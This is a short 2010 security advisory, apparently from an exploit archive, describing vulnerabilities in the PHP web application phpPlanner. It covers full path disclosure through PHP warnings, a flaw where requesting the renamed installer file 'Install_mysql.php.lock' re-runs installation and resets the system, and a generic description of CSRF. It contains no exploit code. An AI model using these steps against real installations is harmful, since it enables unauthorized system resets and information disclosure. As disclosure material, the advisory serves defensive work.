# Date: 13/05/10
# Author: cp77fk4r | empty0page[SHIFT+2]gmail.com | www.DigitalWhisper.co.il
# Software Link: http://phpplanner.sourceforge.net/

# Tested on: PHP
#
##[Full Path Disclosure]
(Full Path Disclosure (FPD) vulnerabilities enable the attacker to see the
path to the webroot/file. e.g.: /home/omg/htdocs/file/. Certain
vulnerabilities, such as using the load_file() (within a SQL Injection)
query to view the page source, require the attacker to have the full path to
the file they wish to view. (OWASP))

Warning: strftime() expects parameter 2 to be long, string given in
[FPD]\phpplanner\lib\functions.php on line 87
#and:
Warning: date() expects parameter 2 to be long, string given in
[FPD]\phpplanner\common.php on line 180
#
##[Remote System Init]
Install_mysql.php's role is to create the database tables during
installation of the system.
After the end of his job, his name will be changed to
"Install_mysql.php.lock":
(rename(__FILE__,__FILE__ . '.lock');)
#
If the attacker will enter to this page (.php.lock) the code will run again
and will reset the system.
#
##[Cross Site Request Forgery]
(CSRF is an attack which forces an end user to execute unwanted actions on a
web application in which he/she is currently authenticated. With a little
help of social engineering (like sending a link via email/chat), an attacker
may force the users of a web application to execute actions of the
attacker's choosing. A successful CSRF exploit can compromise end user data
and operation in case of normal user. If the targeted end user is the
administrator account, this can compromise the entire web application.)
